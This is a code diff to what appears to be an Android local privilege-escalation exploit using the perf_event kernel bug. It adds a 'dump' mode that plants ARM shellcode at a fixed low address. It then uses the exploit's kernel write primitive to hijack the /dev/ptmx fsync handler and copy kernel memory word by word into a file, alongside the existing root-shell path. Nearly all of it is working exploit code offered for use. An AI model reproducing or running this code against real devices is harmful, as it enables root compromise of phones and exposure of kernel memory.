@@ -38,6 +38,7 @@
 #define OFFSET_FILE      DATA_TMP_DIR "perf_event_exploit.offset"
 
 #define KERNEL_ADDRESS 0xc0008000
+#define KERNEL_SIZE    0x02000000
 
 static bool
 call_ptmx_fsync(void *user_data)
@@ -233,6 +234,85 @@ check_possible_offset(int offset)
   return perf_event_run_exploit_with_offset(offset, (int)&nop, call_ptmx_fsync, NULL);
 }
 
+static int dump_code[] = {
+  0xe92d0008, /*   push    {r3}          */
+  0xe59f3008, /*   ldr     r3, [pc, #8]  */
+  0xe5930000, /*   ldr     r0, [r3]      */
+  0xe8bd0008, /*   pop     {r3}          */
+  0xe12fff1e, /*   bx      lr            */
+  0xc0008000,
+};
+
+static bool
+write_kernel_memory(void *code_memory, const char *file_name)
+{
+  int ptmx_fd, output_fd;
+  unsigned int address;
+
+  output_fd = open(file_name, O_CREAT|O_WRONLY|O_TRUNC, 0644);
+  if (output_fd < 0) {
+    return false;
+  }
+
+  ptmx_fd = open("/dev/ptmx", O_WRONLY);
+  for (address = KERNEL_ADDRESS; address < KERNEL_ADDRESS + KERNEL_SIZE; address += 4) {
+    int value;
+    ((int*)code_memory)[5] = address;
+    msync(code_memory, 0x20, MS_SYNC);
+    value = fsync(ptmx_fd);
+    write(output_fd, &value, sizeof(value));
+  }
+  close(ptmx_fd);
+  close(output_fd);
+
+  return true;
+}
+
+static bool
+dump_kernel(int offset, const char *file_name)
+{
+  void *code_memory;
+  int number_of_children;
+
+  printf("dump kernel image to %s.\n", file_name);
+
+  code_memory = mmap((void*)0x1000, 0x20,
+                     PROT_READ|PROT_WRITE|PROT_EXEC,
+                     MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS,
+                     0, 0);
+  memcpy(code_memory, dump_code, sizeof(dump_code));
+
+  number_of_children = perf_event_write_value_at_offset(offset, (int)code_memory);
+  if (number_of_children < 0) {
+    munmap(code_memory, 0x20);
+    return false;
+  }
+
+  if (number_of_children == 0) {
+    while (true) {
+      sleep(1);
+    }
+  }
+
+  write_kernel_memory(code_memory, file_name);
+
+  perf_event_reap_child_process(number_of_children);
+
+  munmap(code_memory, 0x20);
+
+  return true;
+}
+
+static bool
+dump_kernel_image(int offset, int argc, char **argv)
+{
+  const char *file_name = "/data/local/tmp/kernel.img";
+  if (argc >= 3) {
+    file_name = argv[2];
+  }
+  return dump_kernel(offset, file_name);
+}
+
 static bool
 run_exploit(int offset)
 {
@@ -257,7 +337,11 @@ main(int argc, char **argv)
   offset = read_offset();
 
   if (offset > 0) {
-    run_root_shell(offset);
+    if (argc >= 2 && !strcmp("dump", argv[1])) {
+      dump_kernel_image(offset, argc, argv);
+    } else {
+      run_root_shell(offset);
+    }
     exit(EXIT_SUCCESS);
   }
 
